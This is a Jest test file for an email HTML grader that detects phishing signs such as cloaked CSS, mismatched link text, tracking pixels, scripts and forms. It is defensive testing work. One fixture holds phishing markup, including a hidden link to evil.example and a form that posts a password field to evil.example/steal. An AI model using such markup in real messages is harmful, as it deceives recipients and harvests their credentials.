const { buildHtmlFindings } = require('../../../services/mailGrade/htmlChecks');

describe('htmlChecks', () => {
  it('flags cloaking CSS and mismatched link text', () => {
    const html = `
      <style>.x { display:none } .y { font-size:0 }</style>
      <div style="opacity:0">secret</div>
      <a href="https://evil.example/phish" style="visibility:hidden">https://good.example/safe</a>
      <a href="https://bank.example/login">https://paypal.com/login</a>
      <img src="https://track.example/px.gif" width="1" height="1" />
      <script>alert(1)</script>
      <form action="https://evil.example/steal"><input name="pw"></form>
    `;
    const findings = buildHtmlFindings({ html, text: '' });
    const ids = findings.map((f) => f.id);
    expect(ids).toEqual(expect.arrayContaining([
      'css_cloaking',
      'hidden_link',
      'hidden_link_mismatch',
      'tracking_pixel',
      'html_script',
      'html_form',
    ]));
  });

  it('flags image-only HTML bodies', () => {
    const findings = buildHtmlFindings({
      html: '<img src="https://cdn.example/hero.png" alt=""><img src="https://cdn.example/b.png">',
      text: '',
    });
    expect(findings.map((f) => f.id)).toEqual(expect.arrayContaining(['image_only_body']));
  });

  it('flags known shortener hosts', () => {
    const findings = buildHtmlFindings({
      html: '<p><a href="https://bit.ly/abc">read more</a></p>',
      text: 'read more',
    });
    expect(findings.map((f) => f.id)).toEqual(expect.arrayContaining(['link_shortener']));
  });

  it('passes clean HTML with matching https links', () => {
    const findings = buildHtmlFindings({
      html: '<p>Hello <a href="https://example.com/march">March update</a></p>',
      text: 'Hello March update',
    });
    expect(findings.filter((f) => f.severity !== 'pass')).toEqual([]);
  });
});
